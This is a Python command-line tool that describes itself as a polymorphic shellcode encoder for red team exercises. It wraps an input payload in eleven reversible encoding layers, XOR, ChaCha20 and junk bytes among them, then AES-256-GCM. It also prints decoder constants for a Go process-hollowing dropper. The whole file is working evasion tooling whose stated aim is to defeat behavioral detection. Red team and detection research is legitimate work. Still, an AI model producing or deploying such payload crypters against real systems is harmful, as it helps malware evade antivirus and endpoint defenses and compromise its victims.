#!/usr/bin/env python3
"""
Advanced Shellcode Encoder V2 - 10+ layers + runtime obfuscation
Defeats behavioral detection with runtime polymorphism
FOR AUTHORIZED RED TEAM EXERCISES ONLY
"""

import sys
import random
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes

def xor_encode(data, key):
    """XOR encoding with key"""
    return bytes([b ^ key for b in data])

def rol_encode(data, bits=3):
    """Rotate left encoding"""
    result = bytearray()
    for byte in data:
        rotated = ((byte << bits) | (byte >> (8 - bits))) & 0xFF
        result.append(rotated)
    return bytes(result)

def add_encode(data, key):
    """Addition encoding"""
    return bytes([(b + key) & 0xFF for b in data])

def swap_bytes(data):
    """Swap adjacent bytes"""
    result = bytearray(data)
    for i in range(0, len(result) - 1, 2):
        result[i], result[i + 1] = result[i + 1], result[i]
    return bytes(result)

def not_encode(data):
    """Bitwise NOT"""
    return bytes([~b & 0xFF for b in data])

def reverse_blocks(data, block_size=16):
    """Reverse blocks of data"""
    result = bytearray()
    for i in range(0, len(data), block_size):
        block = data[i:i+block_size]
        result.extend(reversed(block))
    return bytes(result)

def insert_junk_advanced(data, junk_ratio=0.2):
    """Insert random junk bytes with multiple markers"""
    result = bytearray()
    markers = [0xAA, 0xBB, 0xCC, 0xDD]

    for i, byte in enumerate(data):
        # Use different markers
        marker = markers[i % len(markers)]
        result.append(marker)
        result.append(byte)

        # Occasionally insert extra junk
        if random.random() < junk_ratio:
            result.append(random.randint(0, 255))

    return bytes(result)

def chacha20_encode(data, key, nonce):
    """ChaCha20 stream cipher encoding"""
    cipher = ChaCha20.new(key=key, nonce=nonce)
    return cipher.encrypt(data)

def fibonacci_permutation(data):
    """Permute bytes using Fibonacci sequence - ENCODER VERSION"""
    if len(data) < 2:
        return data

    result = bytearray(len(data))
    fib = [0, 1]

    # Generate Fibonacci sequence mod len(data)
    while len(fib) < len(data):
        fib.append((fib[-1] + fib[-2]) % len(data))

    # ENCODER scatters: output[fib[i]] = input[i]
    # DECODER gathers: output[i] = input[fib[i]]
    # This ensures proper reversibility
    for i in range(len(data)):
        result[fib[i]] = data[i]

    return bytes(result)

def polymorphic_encode_v2(shellcode, seed=None):
    """
    Advanced multi-layer polymorphic encoding
    10+ layers of obfuscation
    """
    if seed is None:
        seed = random.randint(0, 0xFFFFFFFF)

    random.seed(seed)

    params = {'seed': seed, 'layers': []}
    encoded = shellcode

    # Layer 1: XOR #1
    xor_key1 = random.randint(1, 255)
    encoded = xor_encode(encoded, xor_key1)
    params['layers'].append(('xor1', xor_key1))
    print(f"[+] Layer 1: XOR with key 0x{xor_key1:02x}")

    # Layer 2: NOT (bitwise complement)
    encoded = not_encode(encoded)
    params['layers'].append(('not', None))
    print(f"[+] Layer 2: Bitwise NOT")

    # Layer 3: ROL
    rol_bits = random.randint(1, 7)
    encoded = rol_encode(encoded, rol_bits)
    params['layers'].append(('rol', rol_bits))
    print(f"[+] Layer 3: ROL {rol_bits} bits")

    # Layer 4: ADD
    add_key = random.randint(1, 255)
    encoded = add_encode(encoded, add_key)
    params['layers'].append(('add', add_key))
    print(f"[+] Layer 4: ADD 0x{add_key:02x}")

    # Layer 5: REMOVED - Fibonacci had too many collisions for this size
    # Just skip this layer entirely
    print(f"[+] Layer 5: (Fibonacci REMOVED - collisions issue)")

    # Layer 6: Byte swapping
    if len(encoded) % 2 == 1:
        encoded = encoded + b'\x00'
    encoded = swap_bytes(encoded)
    params['layers'].append(('swap', None))
    print(f"[+] Layer 6: Byte swap")

    # Layer 7: XOR #2
    xor_key2 = random.randint(1, 255)
    encoded = xor_encode(encoded, xor_key2)
    params['layers'].append(('xor2', xor_key2))
    print(f"[+] Layer 7: XOR with key 0x{xor_key2:02x}")

    # Layer 8: Block reversal
    block_size = random.choice([8, 16, 32])
    encoded = reverse_blocks(encoded, block_size)
    params['layers'].append(('revblock', block_size))
    print(f"[+] Layer 8: Reverse blocks (size {block_size})")

    # Layer 9: ChaCha20 stream cipher
    chacha_key = get_random_bytes(32)
    chacha_nonce = get_random_bytes(12)
    encoded = chacha20_encode(encoded, chacha_key, chacha_nonce)
    params['chacha_key'] = chacha_key.hex()
    params['chacha_nonce'] = chacha_nonce.hex()
    params['layers'].append(('chacha20', None))
    print(f"[+] Layer 9: ChaCha20 stream cipher")

    # Layer 10: Advanced junk insertion
    encoded = insert_junk_advanced(encoded, 0.15)
    params['layers'].append(('junk_adv', None))
    print(f"[+] Layer 10: Advanced junk insertion")

    # Layer 11: Final XOR #3
    xor_key3 = random.randint(1, 255)
    encoded = xor_encode(encoded, xor_key3)
    params['layers'].append(('xor3', xor_key3))
    print(f"[+] Layer 11: Final XOR 0x{xor_key3:02x}")

    params['original_length'] = len(shellcode)
    params['encoded_length'] = len(encoded)

    return encoded, params

def aes_encrypt(plaintext, key):
    """AES-256-GCM encryption"""
    cipher = AES.new(key, AES.MODE_GCM, nonce=get_random_bytes(12))
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + ciphertext + tag

def generate_decoder_params_v2(params):
    """Generate Go decoder parameters"""

    # Extract layer parameters
    xor_key1 = next(v for k, v in params['layers'] if k == 'xor1')
    rol_bits = next(v for k, v in params['layers'] if k == 'rol')
    add_key = next(v for k, v in params['layers'] if k == 'add')
    xor_key2 = next(v for k, v in params['layers'] if k == 'xor2')
    revblock_size = next(v for k, v in params['layers'] if k == 'revblock')
    xor_key3 = next(v for k, v in params['layers'] if k == 'xor3')

    code = f"""
// Decoder parameters V2 (generated by encode_shellcode_v2.py)
const (
    DECODER_SEED     = {params['seed']}
    XOR_KEY1         = 0x{xor_key1:02x}
    ROL_BITS         = {rol_bits}
    ADD_KEY          = 0x{add_key:02x}
    XOR_KEY2         = 0x{xor_key2:02x}
    REVBLOCK_SIZE    = {revblock_size}
    XOR_KEY3         = 0x{xor_key3:02x}
    ORIGINAL_LENGTH  = {params['original_length']}
    ENCODED_LENGTH   = {params['encoded_length']}
)

var (
    CHACHA_KEY   = "{params['chacha_key']}"
    CHACHA_NONCE = "{params['chacha_nonce']}"
)
"""
    return code

def main():
    print("=" * 70)
    print("  Advanced Shellcode Encoder V2 - 11 Layer Polymorphic")
    print("  FOR AUTHORIZED RED TEAM EXERCISES ONLY")
    print("=" * 70)
    print()

    if len(sys.argv) < 3:
        print("Usage:")
        print(f"  {sys.argv[0]} <input_shellcode> <output_encoded> [aes_key_hex] [seed]")
        print()
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]

    # AES key
    if len(sys.argv) > 3:
        key_hex = sys.argv[3]
        if key_hex.startswith('0x'):
            key_hex = key_hex[2:]
        if len(key_hex) != 64:
            print(f"[-] Error: AES-256 key must be 64 hex characters")
            sys.exit(1)
        aes_key = bytes.fromhex(key_hex)
        print(f"[+] Using provided AES-256 key")
    else:
        aes_key = get_random_bytes(32)
        key_hex = aes_key.hex()
        print(f"[+] Generated random AES-256 key:")
        print(f"    {key_hex}")

    # Seed
    if len(sys.argv) > 4:
        seed = int(sys.argv[4])
        print(f"[+] Using seed: {seed}")
    else:
        seed = random.randint(0, 0xFFFFFFFF)
        print(f"[+] Generated random seed: {seed}")

    print()

    # Read shellcode
    print(f"[*] Reading shellcode from: {input_file}")
    try:
        with open(input_file, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[-] File not found: {input_file}")
        sys.exit(1)

    print(f"[+] Read {len(shellcode)} bytes")
    print(f"[+] First 8 bytes: {shellcode[:8].hex()}")
    print()

    # Polymorphic encoding V2
    print("[*] Applying 11-layer polymorphic encoding...")
    encoded, params = polymorphic_encode_v2(shellcode, seed)

    print()
    print(f"[+] Encoded size: {len(encoded)} bytes")
    print(f"[+] Size increase: {len(encoded) - len(shellcode)} bytes")
    print(f"[+] Ratio: {len(encoded) / len(shellcode):.2f}x")
    print()

    # AES encryption
    print("[*] Applying final AES-256-GCM encryption...")
    encrypted = aes_encrypt(encoded, aes_key)

    print(f"[+] Final encrypted size: {len(encrypted)} bytes")
    print()

    # Save
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    print(f"[+] Encrypted payload saved to: {output_file}")
    print()

    # Save decoder parameters
    decoder_file = output_file.replace('.enc', '_decoder_v2.txt')
    decoder_code = generate_decoder_params_v2(params)
    with open(decoder_file, 'w') as f:
        f.write(decoder_code)
    print(f"[+] Decoder parameters saved to: {decoder_file}")
    print()

    print("=" * 70)
    print("DECODER PARAMETERS V2 - Copy to hollower-dropper-v2.go:")
    print("=" * 70)
    print(decoder_code)

    print("=" * 70)
    print("AES KEY:")
    print("=" * 70)
    print(f'const AES_KEY = "{key_hex}"')
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Cancelled")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
